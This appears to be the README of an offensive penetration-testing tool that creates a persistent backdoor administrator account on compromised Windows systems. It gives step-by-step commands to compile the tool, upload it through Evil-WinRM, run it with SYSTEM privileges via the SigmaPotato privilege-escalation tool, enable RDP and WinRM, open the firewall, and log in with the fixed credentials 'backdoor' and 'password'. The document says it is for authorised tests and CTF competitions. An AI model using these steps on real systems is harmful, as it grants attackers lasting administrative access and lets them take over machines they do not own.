# Backdoor User Creation Tool

A simple, reliable tool for creating backdoor administrator accounts with RDP and WinRM access during penetration tests and CTF competitions.

## Overview

This tool was created to provide a more reliable alternative to SigmaPotato's built-in `--revshell` function, which doesn't always work as expected. Instead, this tool creates a persistent backdoor administrator account that guarantees both WinRM and RDP access to compromised Windows systems.

## Features

- Creates a backdoor user account with a simple, easy-to-remember password
- Adds the user to the Administrators group
- Ensures the user is added to the Remote Desktop Users group
- Adds the user to the Remote Management Users group for WinRM access
- Enables RDP connections on the target system
- Opens the firewall for RDP access
- Configures Terminal Services to start automatically

## Usage with SigmaPotato

1. Compile the backdoor user creation tool:

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

2. Upload the executable to the target system (e.g., to C:\Windows\Temp):

```powershell
*Evil-WinRM* PS C:\> upload adduser.exe C:\Windows\Temp\adduser.exe
```

3. Execute with SigmaPotato to run with SYSTEM privileges:

```powershell
*Evil-WinRM* PS C:\Windows\Temp> ./SigmaPotato.exe "cmd /c C:\Windows\Temp\adduser.exe"
```

4. Verify the backdoor user was created successfully:

```powershell
*Evil-WinRM* PS C:\Windows\Temp> net user backdoor
*Evil-WinRM* PS C:\Windows\Temp> net localgroup "Remote Desktop Users"
```

5. Connect using RDP or WinRM:

```bash
# Connect via RDP
xfreerdp /u:backdoor /p:password /v:target-ip

# Connect via WinRM
evil-winrm -i target-ip -u backdoor -p password
```

## SigmaPotato Integration

This tool is designed to complement [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato), a privilege escalation tool for Windows.

## Warning

This tool is intended for use in authorized penetration tests and CTF competitions only. Use in unauthorized systems is illegal.

## License

MIT
